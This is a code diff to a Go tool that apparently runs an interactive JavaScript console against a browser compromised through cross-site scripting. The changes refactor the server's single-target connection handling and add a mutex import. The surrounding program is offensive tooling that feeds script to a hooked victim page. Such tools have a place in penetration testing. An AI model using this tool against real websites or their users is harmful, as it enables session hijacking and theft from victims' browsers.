@@ -13,6 +13,7 @@ import (
 	"net/http"
 	"os"
 	"strings"
+	"sync"
 )
 
 var usagePrefix = fmt.Sprintf(`Runs a REPL against an XSS target
@@ -89,7 +90,7 @@ func main() {
 	jsOut := make(chan string, 1)
 	jsErr := make(chan string, 1)
 	connectedMtx := sync.Mutex{}
-	connected := false
+	connected := false // Only connect to one target
 	go func() {
 		http.HandleFunc(*pathFlag, func(w http.ResponseWriter, r *http.Request) {
 			w.Header().Set("Access-Control-Allow-Origin", r.Header.Get("Origin"))
@@ -103,12 +104,9 @@ func main() {
 				connectedMtx.Lock()
 				defer connectedMtx.Unlock()
 				r.Header.Set("Content-Type", "text/javascript")
-				if r.FormValue("connect") == "true" {
-					if !connected {
-						io.WriteString(w, jsInSprintf(<-jsIn))
-					}
-					connected = true
-				} else {
+				connecting := r.FormValue("connect") == "true" && !connected
+				connected = connected || connecting
+				if connecting || r.FormValue("connect") == "" {
 					io.WriteString(w, jsInSprintf(<-jsIn))
 				}
 			case "POST":
